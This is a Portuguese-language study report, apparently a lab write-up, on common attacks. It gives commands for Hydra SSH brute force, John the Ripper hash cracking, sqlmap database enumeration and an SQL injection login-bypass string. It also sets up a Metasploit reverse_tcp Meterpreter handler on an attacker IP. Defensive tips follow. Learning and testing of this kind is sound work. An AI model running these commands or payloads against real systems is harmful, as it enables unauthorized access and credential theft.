Common Attacks - Full Report 

Objetivo
Aprender sobre os ataques mais comuns na área de segurança cibernética e como eles funcionam na prática.

Ferramentas Utilizadas
Hydra: Para ataques de força bruta
John the Ripper: Para quebrar hashes de senhas
SQLmap: Para testar injeção SQL
Metasploit: Para exploração de vulnerabilidades

Passo a Passo Detalhado

1. Ataque de Força Bruta (SSH)

Comando:
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10

Explicação:
hydra: Ferramenta que testa várias combinações de usuário e senha
-l admin: Tenta fazer login com o usuário "admin"
-P rockyou.txt: Usa a lista de senhas mais comuns da internet
ssh://10.10.10.10: Endereço do servidor SSH que estamos atacando

Por que funciona?:
Muitas pessoas usam senhas fracas como "123456" ou "password". Essas senhas estão na lista rockyou.txt.

Como se proteger?:
Usar senhas complexas (mínimo 12 caracteres com números, letras e símbolos)
Habilitar autenticação em dois fatores

2. Quebra de Hashes (John the Ripper)
Comando:
john --format=raw-md5 --wordlist=rockyou.txt hash.txt

Explicação:
john: Programa para quebrar hashes de senhas
--format=raw-md5: Indica que o hash está em formato MD5
--wordlist=rockyou.txt: Usa a mesma lista de senhas comuns
hash.txt: Arquivo contendo o hash que queremos quebrar

Exemplo de Hash:
text
5f4dcc3b5aa765d61d8327deb882cf99  ← Hash MD5 de "password"

Por que é perigoso?:
Muitos sites armazenam senhas como hashes. Se o banco de dados vazar, hashes podem ser quebrados.

3. Injeção SQL (SQLmap)

Comando:
sqlmap -u "http://site.com/login?user=test" --dbs

Explicação:
sqlmap: Ferramenta que testa vulnerabilidades SQL
-u "http://...": URL do site vulnerável
--dbs: Tenta listar todos os bancos de dados

O que é Injeção SQL?:
É quando um atacante envia comandos SQL maliciosos através de um formulário de site.

Exemplo de Ataque:
Digitar ' OR '1'='1 num campo de login pode burlar a autenticação.

4. Exploração com Metasploit

Comandos:
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
exploit

Explicação:
msfconsole: Abre o framework Metasploit
use exploit/...: Seleciona um exploit específico
set payload ...: Configura como o atacante receberá acesso
set LHOST ...: Define o IP do atacante
exploit: Executa o ataque

Como funciona?:
Cria uma "porta dos fundos" (backdoor) no sistema alvo.

Lições Aprendidas
Senhas fracas são a principal causa de ataques bem-sucedidos
Sites vulneráveis podem entregar todos os dados através de SQL Injection
Sistemas desatualizados são alvos fáceis para exploits conhecidos

Como se Proteger?
✅ Use senhas fortes e únicas para cada serviço
✅ Mantenha todos os sistemas atualizados
✅ Use firewalls e monitoramento de rede
✅ Faça testes de penetração regularmente